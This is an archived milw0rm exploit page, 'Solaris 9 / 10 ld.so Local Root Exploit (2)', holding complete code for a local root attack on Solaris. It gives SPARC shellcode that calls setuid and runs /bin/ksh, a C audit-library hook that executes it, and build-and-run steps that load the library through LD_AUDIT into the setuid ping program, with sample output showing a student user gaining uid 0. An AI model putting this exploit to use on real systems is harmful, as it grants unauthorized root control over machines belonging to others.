<html><head><title>Solaris 9 / 10 ld.so Local Root Exploit (2)</title></head><pre>/* 
Solaris 9 on SPARC: 

$ cat dupa.c
*/

char sh[] =
/* setuid() */
&quot;\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08&quot;
/* execve() */
&quot;\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x03\xe0\x20&quot;
&quot;\x92\x02\x20\x10\xc0\x22\x20\x08\xd0\x22\x20\x10\xc0\x22\x20\x14&quot;
&quot;\x82\x10\x20\x0b\x91\xd0\x20\x08/bin/ksh&quot;;

int la_version() {
       void (*f)();
       f = (void*)sh;
       f();
       return 3;
}

/*
$ gcc -fPIC -shared -o /tmp/dupa.so dupa.c
$ export LD_AUDIT=/tmp/dupa.so
$ ping
# id
uid=0(root) gid=100(student)
*/

// milw0rm.com [2005-06-28]</pre></html>